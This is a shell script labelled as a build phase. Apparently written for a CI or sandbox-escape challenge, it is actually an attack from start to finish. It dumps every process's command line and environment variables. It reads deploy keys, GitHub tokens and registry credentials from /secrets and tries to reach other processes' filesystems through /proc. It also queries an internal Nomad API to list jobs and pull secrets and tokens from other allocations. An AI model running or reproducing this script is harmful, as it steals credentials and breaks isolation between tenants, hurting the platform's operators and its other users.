#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PHASE R40 ==="

echo "--- PID1 FULL CMDLINE ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n'
echo "---END-PID1-CMDLINE---"

echo "--- ALL PIDS FULL ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do
  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
  if [ -n "$cmdline" ]; then
    echo "PID=$pid CMD=$cmdline"
  fi
done

echo "--- PID ENVS ALL ---"
for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | sort -n); do
  envdata=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' 2>/dev/null)
  if [ -n "$envdata" ]; then
    echo "=PID=$pid="
    echo "$envdata"
  else
    echo "=PID=$pid= UNREADABLE"
    ls -la /proc/$pid/environ 2>&1
  fi
done

echo "--- READ SECRETS ---"
for f in /secrets/build.env /secrets/deploy_key /secrets/github_token /secrets/run.env /secrets/registry-auth.env; do
  echo "==$f=="
  cat "$f" 2>&1
done

echo "--- PROC 1 STATUS ---"
cat /proc/1/status 2>&1

echo "--- PROC 1 MAPS ---"
cat /proc/1/maps 2>&1 | head -20

echo "--- TRY PROC PID ROOTS ---"
for pid in 27 107 121; do
  echo "==$pid root=="
  ls /proc/$pid/root/secrets/ 2>&1
  cat /proc/$pid/root/secrets/build.env 2>&1 | head -5
  cat /proc/$pid/root/secrets/run.env 2>&1 | head -5
done

echo "--- NOMAD ALLOCS ---"
N=https://169.254.1.2:4646
curl -sk $N/v1/allocations 2>/dev/null | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  for a in data[:15]:
    print(f\"ID={a.get('ID','')} Job={a.get('JobID','')} Status={a.get('ClientStatus','')} Task={a.get('TaskGroup','')}\")
except: print('parse-fail')
" 2>&1

echo "--- NOMAD JOB FALCON ---"
for pattern in falcon pgsql flag ssh key; do
  curl -sk "$N/v1/jobs?prefix=$pattern" 2>/dev/null | head -c 500
  echo
done

echo "--- OTHER ALLOC FS ---"
for AID in $(curl -sk $N/v1/allocations 2>/dev/null | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  for a in data[:20]:
    print(a.get('ID',''))
except: pass
" 2>&1); do
  echo "=FS $AID="
  curl -sk "$N/v1/client/fs/ls/$AID" 2>&1 | head -c 200
  echo
  for f in secrets/run.env secrets/build.env local/nomad_token; do
    resp=$(curl -sk "$N/v1/client/fs/cat/$AID?path=$f" 2>&1)
    if [ -n "$resp" ] && ! echo "$resp" | grep -q "Permission denied"; then
      echo "FILE $AID/$f: $resp" | head -c 500
    fi
  done
done

echo "=== BUILD DONE ==="
